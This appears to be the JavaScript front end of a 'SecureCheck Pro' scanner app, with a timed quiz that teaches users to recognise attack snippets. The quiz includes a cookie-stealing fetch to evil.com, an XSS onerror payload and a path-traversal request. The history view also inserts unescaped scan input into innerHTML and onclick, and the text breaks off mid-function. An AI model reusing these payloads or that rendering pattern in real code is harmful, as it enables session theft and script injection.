/**
 * SecureCheck Pro - High-Fidelity Logic v3.4.9
 * Intelligent Timer-Driven Quiz, Auto-Progression, and Founder Endorsement.
 */

(function() {
    'use strict';

    // --- Core State ---
    const STATE = {
        activeView: 'scanner', activeTab: 'url', isScanning: false, 
        currentPage: 1, itemsPerPage: 6, searchQuery: '',
        quizScore: 0, quizStreak: 0, quizCurrent: 0, 
        quizTimeLeft: 15, quizInt: null,
        quizQuestions: [], quizResults: [],
        worker: null, deferredPrompt: null,
        vaultStats: { avg: 0, trend: 0, series: [] }
    };

    // --- DOM Reference Cache ---
    const dom = {
        navTabs: document.querySelectorAll('.nav-tab'),
        views: document.querySelectorAll('.view-content'),
        urlInput: document.getElementById('url-input'),
        textInput: document.getElementById('text-input'),
        analyzeBtn: document.getElementById('analyze-btn'),
        results: document.getElementById('result-container'),
        terminal: document.getElementById('terminal-log'),
        terminalBox: document.getElementById('terminal-container'),
        themeToggle: document.getElementById('theme-switch-checkbox'),
        toastContainer: document.getElementById('toast-container'),
        quizContainer: document.getElementById('quiz-container'),
        historyList: document.getElementById('history-db-list'),
        historySearch: document.getElementById('history-search'),
        pageInfo: document.getElementById('page-info'),
        statTotal: document.getElementById('scan-counter-big'),
        statAvg: document.getElementById('stat-avg'),
        headerInstallBtn: document.getElementById('header-install-btn')
    };

    // --- Database Manager ---
    const DB = {
        name: 'SecureCheckDB', ver: 1, db: null,
        async init() {
            return new Promise((r) => {
                const req = indexedDB.open(this.name, this.ver);
                req.onupgradeneeded = e => {
                    const db = e.target.result;
                    if (!db.objectStoreNames.contains('scans')) 
                        db.createObjectStore('scans', { keyPath: 'id', autoIncrement: true }).createIndex('timestamp', 'timestamp');
                };
                req.onsuccess = e => { this.db = e.target.result; r(); };
            });
        },
        async save(data) {
            const tx = this.db.transaction(['scans'], 'readwrite');
            data.timestamp = new Date().toISOString();
            return new Promise(r => tx.objectStore('scans').add(data).onsuccess = r);
        },
        async getAll() {
            if (!this.db) return [];
            return new Promise(resolve => {
                const results = [];
                const tx = this.db.transaction(['scans'], 'readonly');
                tx.objectStore('scans').index('timestamp').openCursor(null, 'prev').onsuccess = e => {
                    const cursor = e.target.result;
                    if (cursor) { results.push(cursor.value); cursor.continue(); }
                    else resolve(results);
                };
            });
        },
        async clear() { return new Promise(r => this.db.transaction(['scans'], 'readwrite').objectStore('scans').clear().onsuccess = r); }
    };

    // --- PWA Installation Manager ---
    const PWA = {
        init() {
            if ('serviceWorker' in navigator) {
                navigator.serviceWorker.register('sw.js').then(reg => {
                    console.log("[PWA] Service Worker Registered: ", reg.scope);
                }).catch(err => console.error("[PWA] Service Worker Failure: ", err));
            }

            const updatePWAState = () => {
                const isStandalone = window.matchMedia('(display-mode: standalone)').matches || (typeof chrome !== 'undefined' && chrome.runtime && chrome.runtime.id);
                if (isStandalone && dom.headerInstallBtn) {
                    dom.headerInstallBtn.querySelector('button').innerHTML = `
                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3.5" style="margin-right:2px;"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
                        PLUGIN ACTIVE
                    `;
                    dom.headerInstallBtn.style.opacity = '0.6';
                }
            };
            updatePWAState();

            window.addEventListener('beforeinstallprompt', (e) => {
                e.preventDefault(); STATE.deferredPrompt = e;
                if (dom.headerInstallBtn) {
                    dom.headerInstallBtn.querySelector('button').innerHTML = `
                         <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3.5" style="margin-right:2px;"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
                         INSTALL TO BROWSER
                    `;
                    dom.headerInstallBtn.style.opacity = '1';
                    Toast.show("Native Integration Hub Ready", "safe");
                }
            });

            window.addEventListener('appinstalled', () => {
                updatePWAState();
                Toast.show("SecureCheck Pro Integrated Successfully", "safe");
                STATE.deferredPrompt = null;
            });

            const triggerInstall = () => {
                const modal = document.getElementById('install-modal');
                if (modal) modal.classList.remove('hidden');
            };

            if (dom.headerInstallBtn) dom.headerInstallBtn.onclick = triggerInstall;
            if (dom.historySearch) dom.historySearch.oninput = (e) => { STATE.searchQuery = e.target.value.toLowerCase(); STATE.currentPage = 1; UI.renderHistory(); };
        },

        async engagePWA() {
            document.getElementById('install-modal').classList.add('hidden');
            if (STATE.deferredPrompt) {
                STATE.deferredPrompt.prompt();
                const { outcome } = await STATE.deferredPrompt.userChoice;
                if (outcome === 'accepted') Toast.show("NATIVE_APP_INTEGRATED", "safe");
                STATE.deferredPrompt = null;
            } else {
                alert("OFFLINE_APP_WIZARD:\n\nSelect 'Install SecureCheck Pro' from your browser's address bar or menu to create a NATIVE app shell.");
            }
        },

        downloadOfflineSource() {
            document.getElementById('install-modal').classList.add('hidden');
            Toast.show("EXTRACTING_SOURCE_ARCHIVE...", "warn");
            setTimeout(() => {
                const dummy = document.createElement('a');
                dummy.href = 'index.html';
                dummy.download = 'SecureCheckPro_Forensic_Suite.html';
                dummy.click();
                Toast.show("SOURCE_ARCHIVE_EXTRACTED", "safe");
            }, 1000);
        }
    };

    // --- Theme Manager ---
    const Theme = {
        init() {
            const current = localStorage.getItem('securecheck_theme') || 'dark';
            this.set(current);
            if (dom.themeToggle) {
                dom.themeToggle.onchange = () => {
                    const updated = dom.themeToggle.checked ? 'dark' : 'light';
                    this.set(updated);
                };
            }
        },
        set(t) {
            document.documentElement.classList.toggle('light-mode', t === 'light');
            if (dom.themeToggle) dom.themeToggle.checked = (t === 'dark');
            localStorage.setItem('securecheck_theme', t);
        }
    };

    // --- Magnetic Interactions ---
    const Magnetic = {
        init() {
            const targets = document.querySelectorAll('.magnetic-wrap');
            targets.forEach(target => {
                target.addEventListener('mousemove', (e) => {
                    const rect = target.getBoundingClientRect();
                    const x = e.clientX - rect.left - rect.width / 2;
                    const y = e.clientY - rect.top - rect.height / 2;
                    target.style.transform = `translate(${x * 0.2}px, ${y * 0.2}px)`;
                });
                target.addEventListener('mouseleave', () => target.style.transform = 'translate(0px, 0px)');
            });
        }
    };

    // --- Quiz Engine (Human-Scaled Typography + Timer v3.4.9) ---
    const Quiz = {
        bank: [
            { id: 1, snippet: "element.innerHTML = eval(userInput);", question: "Identify the critical flaw:", options: ["Cross-Site Scripting + Injection", "Missing Image Description", "Secure Execution", "Path Traversal Fault"], correctIndex: 0, explanation: "I've seen entire clusters fall to this simple eval(). It parses user strings into executable code, giving attackers full control over the session.", difficulty: "easy" },
            { id: 2, snippet: "SELECT * FROM users WHERE id = '\" + userId + \"'", question: "What is the primary risk?", options: ["User Data Leakage (XSS)", "SQL Query Injection (SQLi)", "Cross-Site Forgery (CSRF)", "Open Domain Redirect"], correctIndex: 1, explanation: "This is classic SQLi. By inserting a single quote, an attacker can hijack your entire database query logic and potentially dump user records.", difficulty: "easy" },
            { id: 3, snippet: "http://bank-login.com/secure", question: "Why is this URL flaggable?", options: ["IDN Phishing Pattern", "Insecure Transmission Protocol", "Homoglyph Character Swap", "Punycode Obfuscation"], correctIndex: 1, explanation: "HTTP is ancient history for logins. Without TLS encryption, anyone on the local network can sniff the password as it travels over the air.", difficulty: "easy" },
            { id: 4, snippet: "fetch('https://evil.com?c=' + document.cookie)", question: "What does this code do?", options: ["Secure API Fetch", "Remote Cookie Exfiltration", "Mock Data Request", "Header Validation"], correctIndex: 1, explanation: "Never let cookies out of your sight. This line ships session tokens straight to an external collector server.", difficulty: "medium" },
            { id: 5, snippet: "obj[userKey][userValue] = true; // userKey='__proto__'", question: "What attack is this?", options: ["Internal Prototype Pollution", "Directory Path Traversal", "Cross-Site Scripting", "Global Buffer Overflow"], correctIndex: 0, explanation: "Advanced threat. Manipulating the internal __proto__ key allows global object poisoning, often leading to Remote Code Execution.", difficulty: "hard" },
            { id: 6, snippet: "https://trusted.com/l?next=https://evil.com", question: "Identify the primary vector:", options: ["SQL Payload Injection", "Malicious Open Redirect", "Character Homoglyph", "Stored Script Attack"], correctIndex: 1, explanation: "Users trust the 'trusted.com' prefix, but the hidden next parameter sends them into a phishing gateway.", difficulty: "medium" },
            { id: 7, snippet: '<script src=\"https://cdn.evil.com/jq.js\"></script>', question: "What critical safeguard is missing?", options: ["Tag ID Attribute", "Subresource Integrity (SRI) Hash", "Alt Text Documentation", "Data Charset Encoding"], correctIndex: 1, explanation: "If someone poisons that external CDN, your application goes down with it. SRI hashes prevent the loading of tampered third-party scripts.", difficulty: "medium" },
            { id: 8, snippet: "GET /files?name=../../etc/passwd", question: "Type of scan result found:", options: ["SQL Injection Node", "Active Path Traversal", "Reflected Scripting", "Stack Buffer Overflow"], correctIndex: 1, explanation: "The '../' sequence tests for directory depth access. If successful, it exposes internal system configuration files directly to the web.", difficulty: "easy" },
            { id: 9, snippet: "https://аpple.tk/login", question: "Analyze the 'а' (U+0430). Identify the threat:", options: ["Authentic Verified URL", "Homoglyph Camouflage Attack", "Punycode String Mask", "HSTS Domain Skip"], correctIndex: 1, explanation: "Homoglyphs are character lookalikes. That Cyrilic 'a' isn't Latin. This is the phisher's favorite camouflage.", difficulty: "hard" },
            { id: 10, snippet: "https://xn--pypl-p9a8524h.com", question: "What domain encoding system is active?", options: ["Base64 Text Header", "Punycode / IDN Scheme", "Hexadecimal Character Map", "ASCII-8 Secure Mask"], correctIndex: 1, explanation: "Punycode translates Unicode to ASCII. Attackers use it to create 'Apple.com' domains using lookalike characters.", difficulty: "hard" },
            { id: 11, snippet: "<img src=x onerror=alert(1)>", question: "Detect the specific injection node:", options: ["Operational Buffer Leak", "SVG Path Traversal", "Reflected Scripting Attack (XSS)", "SQL Data Exfiltration"], correctIndex: 2, explanation: "Classical XSS. The browser's onerror event is triggered by the invalid source, executing the script. In the field, this leads to credential theft.", difficulty: "easy" },
            { id: 12, snippet: "setcookie('SID', '123', ['Secure', 'HttpOnly']);", question: "Analyze the active safeguard:", options: ["Transport Level Integrity", "Cross-Site Request Shielding", "In-Memory Session Mask", "Cross-Domain Data Blocking"], correctIndex: 1, explanation: "The 'HttpOnly' flag prevents JavaScript from accessing the cookie, effectively neutralizing many XSS-based cookie theft attacks.", difficulty: "medium" },
            { id: 13, snippet: "document.location = params.get('redirect_to');", question: "Operational vulnerability found:", options: ["SQL Injection Hook", "Homoglyph Domain Swap", "Insecure Destination Redirect", "Buffer Overwrite Node"], correctIndex: 2, explanation: "Trusting user input for redirects is dangerous. It allows phishers to use your trusted site as a springboard to malicious destinations.", difficulty: "medium" },
            { id: 14, snippet: "res.setHeader('Content-Security-Policy', \"default-src 'self'\");", question: "What system layer is being reinforced?", options: ["Client-Side Policy (CSP)", "Database Isolation Schema", "Transport Layer Encryption", "Server Cache Integrity"], correctIndex: 0, explanation: "CSP is the ultimate barrier against unwanted script execution. It tells the browser exactly which sources are trusted for resources.", difficulty: "hard" },
            { id: 15, snippet: "eval(atob('YWxlcnQoJ0V4cGxvaXRlZCcp'));", question: "Sophisticated obfuscation detected:", options: ["IDN Homoglyph Mask", "Base64 Decryption + Execution", "SQL Query Concatenation", "In-Memory Buffer Overrun"], correctIndex: 1, explanation: "The string is Base64 encoded. The 'atob' function translates it back to raw code, which 'eval' then executes. Essential for stealthy payloads.", difficulty: "hard" }
        ],
        difficultyTimers: { easy: 10, medium: 12, hard: 15 },
        shuffle() {
            STATE.quizQuestions = [...this.bank];
            for (let i = STATE.quizQuestions.length - 1; i > 0; i--) {
                const j = Math.floor(Math.random() * (i + 1));
                [STATE.quizQuestions[i], STATE.quizQuestions[j]] = [STATE.quizQuestions[j], STATE.quizQuestions[i]];
            }
            // Logic to shuffle internal options to prevent predictability (V3.5.0)
            STATE.quizQuestions.forEach(q => {
                const correctText = q.options[q.correctIndex];
                for (let i = q.options.length - 1; i > 0; i--) {
                    const j = Math.floor(Math.random() * (i + 1));
                    [q.options[i], q.options[j]] = [q.options[j], q.options[i]];
                }
                q.correctIndex = q.options.indexOf(correctText);
            });
        },
        start() {
            this.shuffle(); STATE.quizCurrent = 0; STATE.quizScore = 0; STATE.quizResults = [];
            this.render();
        },
        render() {
            if (STATE.quizCurrent >= STATE.quizQuestions.length) return this.finish();
            const q = STATE.quizQuestions[STATE.quizCurrent];
            STATE.quizTimeLeft = this.difficultyTimers[q.difficulty] || 15;
            
            dom.quizContainer.innerHTML = `
                 <div style="background:var(--surface-1); border-bottom:2px solid var(--border); padding:1.5rem 2.5rem; display:flex; justify-content:space-between; align-items:center;">
                    <div>
                        <h4 style="font-family:var(--font-mono); font-size:0.7rem; color:var(--accent); letter-spacing:1px; font-weight:900; margin-bottom:5px; text-transform:uppercase;">Intelligent Audit Simulation</h4>
                        <h3 style="font-size:1.4rem; font-weight:950; letter-spacing:-1px; color:var(--text-strong);">Scenario Site 0${STATE.quizCurrent + 1}</h3>
                    </div>
                    <div style="display:flex; gap:3rem; align-items:center;">
                        <div style="text-align:right;">
                            <small style="font-weight:950; color:var(--text-dim); text-transform:uppercase; font-size:0.6rem; letter-spacing:1.5px; display:block;">Threat Level</small>
                            <span style="font-family:var(--font-mono); font-size:1.1rem; font-weight:950; color:var(--accent); text-transform:uppercase;">${q.difficulty}</span>
                        </div>
                        <div style="text-align:right;">
                            <small style="font-weight:950; color:var(--text-dim); text-transform:uppercase; font-size:0.6rem; letter-spacing:1.5px; display:block;">Operational Timer</small>
                            <span id="quiz-timer" style="font-family:var(--font-mono); font-size:1.4rem; font-weight:950; color:var(--risky);">${STATE.quizTimeLeft}s</span>
                        </div>
                        <div style="text-align:right;">
                            <small style="font-weight:900; color:var(--text-dim); text-transform:uppercase; font-size:0.6rem; letter-spacing:1px; display:block;">Vault Sync</small>
                            <div style="width:100px; height:6px; background:var(--surface-0); border-radius:10px; margin-top:6px; overflow:hidden; border:1px solid var(--border);">
                                <div style="width:${(STATE.quizCurrent+1)/STATE.quizQuestions.length*100}%; height:100%; background:var(--accent); transition:0.4s cubic-bezier(0.2, 1, 0.2, 1);"></div>
                            </div>
                        </div>
                    </div>
                 </div>

                 <div class="bento-card" style="margin-top:0; border-top-left-radius:0; border-top-right-radius:0; padding:2.5rem; background:var(--surface-0);">
                     <div class="blueprint-code" style="margin-bottom:2.5rem; padding:1.5rem;">
                        <code style="display:block; white-space:pre-wrap; font-size:0.95rem; font-weight:700; line-height:1.5;">${this.esc(q.snippet)}</code>
                     </div>
                     
                     <h3 style="margin-bottom:2.5rem; line-height:1.3; font-size:1.2rem; color:var(--text-strong); font-weight:950;">${q.question}</h3>
                     
                     <div class="choice-tile-grid">
                         ${q.options.map((opt, i) => `
                            <button class="quiz-option tile" onclick="Quiz.select(${i})" style="height: auto; padding: 1rem 1.75rem;">
                                <div style="display:flex; justify-content:space-between; align-items:center; width:100%;">
                                    <span style="font-size:0.9rem; font-weight:900;">${opt}</span>
                                    <small style="font-family:var(--font-mono); font-size:0.6rem; color:var(--accent); font-weight:950; opacity:0.6;">NODE-${i+1}</small>
                                </div>
                            </button>
                         `).join('')}
                     </div>
                     <div id="quiz-feedback" class="hidden"></div>
                 </div>
             `;

             this.startTimer();
        },
        startTimer() {
            if (STATE.quizInt) clearInterval(STATE.quizInt);
            // Timer set in render() for synchronization
            const timerEl = document.getElementById('quiz-timer');
            STATE.quizInt = setInterval(() => {
                STATE.quizTimeLeft--;
                if (timerEl) timerEl.textContent = `${STATE.quizTimeLeft}s`;
                if (STATE.quizTimeLeft <= 0) {
                    clearInterval(STATE.quizInt);
                    this.select(-1);
                }
            }, 1000);
        },
        select(idx) {
            clearInterval(STATE.quizInt);
            const q = STATE.quizQuestions[STATE.quizCurrent];
            const btns = document.querySelectorAll('.quiz-option');
            const feedback = document.getElementById('quiz-feedback');
            const isCorrect = idx === q.correctIndex;
            
            STATE.quizResults.push({ question: q.question, userAnswer: idx === -1 ? 'TIME OUT' : q.options[idx], correct: isCorrect, explanation: q.explanation });

            btns.forEach((b, i) => {
                b.style.pointerEvents = "none";
                if (i === q.correctIndex) { b.style.borderColor = 'var(--safe)'; b.style.background = 'rgba(16, 185, 129, 0.08)'; b.querySelector('span').style.color = 'var(--safe)'; }
                if (idx !== -1 && i === idx && i !== q.correctIndex) { b.style.borderColor = 'var(--risky)'; b.style.background = 'rgba(244, 63, 94, 0.08)'; b.querySelector('span').style.color = 'var(--risky)'; }
            });

            if (isCorrect) { STATE.quizScore += 10; Toast.show("Operational Logic Verified", "safe"); }
            else if (idx === -1) { Toast.show("Response Time Out", "risky"); }
            else Toast.show("Discrepancy Found", "risky");

            feedback.innerHTML = `
                <div class="field-note" style="padding:1.25rem 1.75rem; margin-top:1.5rem;">
                    <h4 style="margin-bottom:0.75rem; font-size:0.75rem; font-weight:950; text-transform:uppercase; letter-spacing:1.5px;">Forensic Feedback ${idx === -1 ? '(TIME OUT)' : ''}</h4>
                    <p style="font-size:0.9rem; line-height:1.6; font-weight:700;">${q.explanation}</p>
                    <button class="action-btn" style="margin-top:1.25rem; width:100%; padding:12px; font-size:0.85rem;" onclick="Quiz.next()">Next Scenario &rarr;</button>
                </div>
            `;
            feedback.classList.remove('hidden');
            
            if (idx === -1) {
                setTimeout(() => this.next(), 3000);
            } else {
                setTimeout(() => feedback.scrollIntoView({ behavior: 'smooth', block: 'end' }), 100);
            }
        },
        next() { clearInterval(STATE.quizInt); STATE.quizCurrent++; this.render(); },
        finish() {
            const accuracy = Math.round((STATE.quizResults.filter(r => r.correct).length / STATE.quizResults.length) * 100);
            dom.quizContainer.innerHTML = `
                <div class="audit-certificate" style="padding:4rem; border-width:12px;">
                    <div style="border-bottom:2.5px solid #000; padding-bottom:3rem; margin-bottom:4rem; text-align:center;">
                        <h1 style="font-size:2.2rem; font-weight:950; text-transform:uppercase; letter-spacing:5px; margin:0;">Operational Integrity Certificate</h1>
                        <p style="font-family:var(--font-mono); font-size:0.9rem; margin-top:15px; font-weight:900; opacity:0.6;">AUTHENTICATED BY SECURECHECK PRO // RECORDED: ${new Date().toLocaleDateString()}</p>
                    </div>

                    <div style="display:grid; grid-template-columns:1fr 1fr; gap:4rem; margin-bottom:5rem;">
                        <div>
                            <h4 style="text-transform:uppercase; font-size:0.8rem; color:#444; border-bottom:1.5px solid #eee; padding-bottom:15px; margin-bottom:20px; font-weight:950;">Heuristic Accuracy</h4>
                            <div style="font-size:4rem; font-weight:950; line-height:1; letter-spacing:-4px;">${accuracy}%</div>
                            <p style="font-weight:950; color:var(--safe); font-size:0.8rem; margin-top:10px;">SUCCESSFUL VERIFICATION</p>
                        </div>
                        <div>
                            <h4 style="text-transform:uppercase; font-size:0.8rem; color:#444; border-bottom:1.5px solid #eee; padding-bottom:15px; margin-bottom:20px; font-weight:950;">Operational Score</h4>
                            <div style="font-size:4rem; font-weight:950; line-height:1; letter-spacing:-4px;">${STATE.quizScore}</div>
                            <p style="font-weight:950; color:var(--accent); font-size:0.8rem; margin-top:10px;">VOLUME CAPACITY POOL</p>
                        </div>
                    </div>

                    <div style="font-size:1.1rem; line-height:1.8; color:#111; margin-bottom:5rem; border-top:2px dashed #ddd; padding-top:3rem; font-weight:700;">
                        <p style="font-style:italic; border-left:5px solid var(--accent); padding-left:25px; margin-bottom:2.5rem; font-weight:800; font-size:1.2rem; line-height:1.6;">"True resilience isn't a layer you add—it's a philosophy you must inhabit. Forensic precision is the only absolute safeguard in a deceptive age."</p>
                        <p>This document officially endorses the candidate's professional competence in the field of modern behavioral heuristics and threat mitigation.</p>
                        
                        <div style="margin-top:4rem; display:flex; justify-content:space-between; align-items:flex-end;">
                            <div>
                                <div style="position:relative; margin-top:3.5rem; width:fit-content;">
                                    <div style="position:absolute; top:-45px; left:50%; transform:translateX(-50%); opacity:0.75; pointer-events:none; z-index:0;">
                                        <img src="download (1).jpg" alt="Forensic Seal" style="width:75px; height:auto; display:block; filter:contrast(1.2) grayscale(1);">
                                    </div>
                                    <div class="founder-sig" style="margin-top:0; position:relative; z-index:1;">Arisudan</div>
                                </div>
                                <p style="font-size:0.65rem; text-transform:uppercase; font-weight:950; opacity:0.7; margin-top:8px; letter-spacing:1px;">Founding Architect & Auditor</p>
                            </div>
                            <div style="text-align:right;">
                                <p style="font-size:0.8rem; font-weight:950; text-transform:uppercase; color:#10b981;">AWARDS OF APPRECIATION</p>
                                <p style="font-size:0.65rem; font-weight:900; opacity:0.6;">EXCELLENCE IN FORENSIC SIMULATION</p>
                            </div>
                        </div>
                    </div>

                    <div class="seal-verified">OFFICIAL VERIFIED SEAL</div>
                    
                    <div style="display:flex; gap:1.5rem;">
                        <button class="action-btn" style="flex:2.5; background:#000;" onclick="Quiz.start()">Return to Field Nodes</button>
                        <button class="action-btn" style="flex:1; background:transparent; color:#000; border:3.5px solid #000;" onclick="window.print()">Print Documentation</button>
                    </div>
                </div>
            `;
        },
        esc: s => s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
    };

    // --- Core Logic ---
    const App = {
        async init() { 
            await DB.init(); 
            if (typeof Theme !== 'undefined') Theme.init();
            if (typeof PWA !== 'undefined') PWA.init();
            if (typeof Magnetic !== 'undefined') Magnetic.init();
            this.handleDeepLinks(); 
            this.bind(); 
            this.updateCounter(); 
        },
        bind() {
            dom.navTabs.forEach(tab => {
                tab.addEventListener('click', () => {
                    const viewToOpen = tab.dataset.view;
                    dom.navTabs.forEach(t => t.classList.toggle('active', t === tab));
                    dom.views.forEach(v => v.classList.toggle('hidden', v.id !== viewToOpen + '-view'));
                    if (viewToOpen !== 'quiz') clearInterval(STATE.quizInt);
                    if (viewToOpen === 'quiz') Quiz.start();
                    if (viewToOpen === 'history') this.renderHistory();
                });
            });

            // --- Keyboard Command Center ---
            window.addEventListener('keydown', e => {
                if (e.ctrlKey && e.key === 'Enter') this.analyze();
                if (e.key === 'Escape') { if (dom.results) dom.results.classList.add('hidden'); if (dom.terminalBox) dom.terminalBox.classList.add('hidden'); }
                if (e.key === '/' && document.activeElement.tagName !== 'INPUT' && document.activeElement.tagName !== 'TEXTAREA') { 
                    e.preventDefault(); 
                    if (dom.navTabs[2]) dom.navTabs[2].click();
                    dom.historySearch.focus(); 
                }
            });

            document.querySelectorAll('.card-tab-btn').forEach(b => b.onclick = () => {
                document.querySelectorAll('.card-tab-btn').forEach(x => {
                    x.classList.toggle('active', x === b);
                    x.style.background = x === b ? 'var(--text-strong)' : 'transparent';
                    x.style.color = x === b ? 'var(--bg)' : 'var(--text-muted)';
                });
                document.getElementById('url-pane').classList.toggle('hidden', b.dataset.tab !== 'url');
                document.getElementById('text-pane').classList.toggle('hidden', b.dataset.tab !== 'text');
                STATE.activeTab = b.dataset.tab;
            });

            dom.analyzeBtn.onclick = () => this.analyze();
            if (dom.themeToggle) dom.themeToggle.onclick = () => { document.documentElement.classList.toggle('light-mode'); this.renderHistory(); };
            if (dom.headerInstallBtn) dom.headerInstallBtn.onclick = () => PWA.install();

            window.addEventListener('online', () => this.updateOnlineStatus());
            window.addEventListener('offline', () => this.updateOnlineStatus());
            this.updateOnlineStatus();
            
            const wipeBtn = document.getElementById('history-clear-all');
            if (wipeBtn) wipeBtn.onclick = async () => { if (confirm("Permanently wipe audit vault?")) { await DB.clear(); this.renderHistory(); this.updateCounter(); Toast.show("Vault Database Cleared", "safe"); } };
            dom.historySearch.oninput = (e) => { STATE.searchQuery = e.target.value.toLowerCase(); STATE.currentPage = 1; this.renderHistory(); };
            
            const exRisky = document.getElementById('example-risky');
            const exSafe = document.getElementById('example-safe');
            if (exRisky) exRisky.onclick = () => { dom.urlInput.value = "http://аpple.tk/login"; this.analyze(); };
            if (exSafe) exSafe.onclick = () => { dom.urlInput.value = "https://google.com"; this.analyze(); };

            document.getElementById('prev-page').onclick = () => { if (STATE.currentPage > 1) { STATE.currentPage--; this.renderHistory(); } };
            document.getElementById('next-page').onclick = () => { STATE.currentPage++; this.renderHistory(); };
        },
        updateOnlineStatus() {
            const banner = document.getElementById('offline-banner');
            if (banner) banner.classList.toggle('hidden', navigator.onLine);
            if (!navigator.onLine) Toast.show("Core Vault: Offline Logic Engaged", "warn");
        },
        handleDeepLinks() {
            const hash = window.location.hash;
            if (hash.startsWith('#audit=')) {
                try {
                    const data = JSON.parse(atob(decodeURIComponent(hash.split('=')[1])));
                    setTimeout(() => { if (UI) UI.renderScan(data); Toast.show("INTEL HYDRATED FROM DEEP-LINK", "safe"); }, 500);
                } catch(e) { console.error("Link corruption detected."); }
            }
        },
        async analyze() {
            const input = (STATE.activeTab === 'url' ? dom.urlInput.value : dom.textInput.value).trim();
            if (input.length < 3) return Toast.show("Operational Buffer Empty", "risky");
            
            dom.analyzeBtn.disabled = true; dom.results.classList.add('hidden'); dom.terminalBox.classList.remove('hidden');
            dom.terminal.innerHTML = '';
            
            const addLog = (m, c, d) => new Promise(resolve => setTimeout(() => {
                const line = document.createElement('div');
                line.style.cssText = `color:var(--${c || 'text-main'}); margin-bottom:6px; opacity:0; transform:translateX(-10px); transition:0.3s;`;
                line.innerHTML = `<span style="opacity:0.4; color:var(--text-dim);">[${new Date().toLocaleTimeString([], {hour12:false})}]</span> <span style="color:var(--accent); font-weight:900;">></span> ${m}`;
                dom.terminal.appendChild(line);
                requestAnimationFrame(() => { line.style.opacity = '1'; line.style.transform = 'translateX(0)'; });
                dom.terminal.scrollTop = dom.terminal.scrollHeight;
                resolve();
            }, d || 200));

            await addLog("Initiating Forensic Heuristic Audit...", "accent", 0);
            await addLog("Loading Security Definitions Node 0x7F...", "text-muted", 300);
            await addLog(`Scanning Target Buffer: ${input.substring(0, 15)}...`, "warn", 400);

            if (STATE.worker) STATE.worker.terminate();
            STATE.worker = new Worker('scanner.worker.js');
            STATE.worker.postMessage({ input, mode: STATE.activeTab });
            
            STATE.worker.onmessage = async (e) => {
                const res = e.data;
                
                await addLog("Injecting Heuristic Probes...", "text-muted", 500);
                await addLog("Checking Reputation Registry...", "text-muted", 400);
                await addLog("Evaluated Homoglyph Resistance...", "safe", 600);
                await addLog("Finalizing Risk Matrix...", "accent", 400);

                res.id = Date.now(); res.inputValue = input; res.inputPreview = input.substring(0, 42);
                await DB.save(res); UI.renderScan(res); dom.analyzeBtn.disabled = false;
                
                await addLog(`Audit Complete. Tactical Index: ${res.score}%`, res.status === 'safe' ? "safe" : "risky", 300);
                this.updateCounter();
            };
        },
        async renderHistory() {
            const all = await DB.getAll();
            const filtered = all.filter(s => s.inputValue.toLowerCase().includes(STATE.searchQuery));
            const chunk = filtered.slice((STATE.currentPage - 1) * STATE.itemsPerPage, STATE.currentPage * STATE.itemsPerPage);
            dom.historyList.innerHTML = `
                <div class="bento-grid" style="grid-auto-rows: minmax(80px, auto); gap:1.2rem;">
                    ${chunk.map(s => `
                        <div class="bento-card span-12" style="display:flex; justify-content:space-between; align-items:center; padding:1.25rem 2.5rem;" onclick="dom.urlInput.value='${s.inputValue}'; dom.analyzeBtn.click();">
                            <div style="display:flex; align-items:center; gap:20px;">
                                <div style="width:12px; height:12px; border-radius:50%; background:var(--${s.status}); border:2px solid #fff;"></div>
                                <div style="font-family:var(--font-mono); font-size:1rem; font-weight:950; color:var(--text-strong);">${s.inputPreview}...</div>
                            </div>
                            <div style="font-weight:950; color:var(--${s.status}); font-family:var(--font-mono); font-size:1.8rem; letter-spacing:-1.5px; display:flex; align-items:baseline; gap:5px;">${s.score}<span style="font-size:0.8rem; opacity:0.6; letter-spacing:0;">%</span></div>
                        </div>
                    `).join(chunk.length ? '' : `<div class="span-12" style="opacity:0.25; padding:6rem; text-align:center; font-weight:950;">NO MATCHES FOUND</div>`)}
                </div>
            `;
            const mean = all.length ? Math.round(all.reduce((a, b) => a + b.score, 0) / all.length) : 0;
            dom.statAvg.innerHTML = `<span style="display:inline-flex; align-items:baseline; gap:5px; font-weight:950; color:var(--accent); font-size:4.5rem; letter-spacing:-4px;">${mean}<small style="font-size:1.5rem; opacity:0.5;">%</small></span>`;
            this.renderVaultCharts(all);
        },
        renderVaultCharts(all) {
            const container = document.getElementById('vault-chart-container');
            if (!container) return;
            const last15 = all.slice(-15);
            
            // Add high-end atmosphere
            container.style.overflow = 'hidden';
            container.style.display = 'flex';
            container.style.alignItems = 'flex-end';
            container.style.justifyContent = 'center';
            container.style.gap = '12px';
            container.style.padding = '0 20px';

            container.innerHTML = `
                <div style="position:absolute; inset:0; background:linear-gradient(180deg, transparent 60%, rgba(59,130,246,0.03) 100%); pointer-events:none;"></div>
                <div style="position:absolute; inset:0; background-image: radial-gradient(var(--border) 1px, transparent 1px); background-size: 24px 24px; opacity:0.1; pointer-events:none;"></div>
                <div style="position:absolute; left:0; right:0; height:2px; background:linear-gradient(90deg, transparent, var(--accent), transparent); opacity:0.2; animation: chartScan 3s ease-in-out infinite; pointer-events:none;"></div>
                
                ${last15.map((s, i) => `
                    <div class="chart-bar-capsule" 
                        style="width:20px; height:${Math.max(s.score, 10)}%; 
                        background:linear-gradient(180deg, var(--${s.score > 70 ? 'safe' : (s.score > 40 ? 'warn' : 'risky')}) 0%, rgba(0,0,0,0.1) 100%); 
                        border-radius:100px; 
                        box-shadow: 0 4px 15px rgba(0,0,0,0.2), inset 0 0 10px rgba(255,255,255,0.05);
                        opacity: 0.8; transition: all 0.4s cubic-bezier(0.2, 1, 0.2, 1);
                        animation: barGrowth 1s cubic-bezier(0, 1.3, 0.3, 1) forwards;
                        animation-delay: ${i * 0.04}s; transform: scaleY(0); transform-origin: bottom;" 
                        title="Audit: ${s.inputPreview}... | Score: ${s.score}%">
                    </div>
                `).join('') || `<div style="width:100%; text-align:center; opacity:0.1; font-family:'DM Mono'; font-weight:950; letter-spacing:2px; align-self:center;">NO_DATA_NODES</div>`}
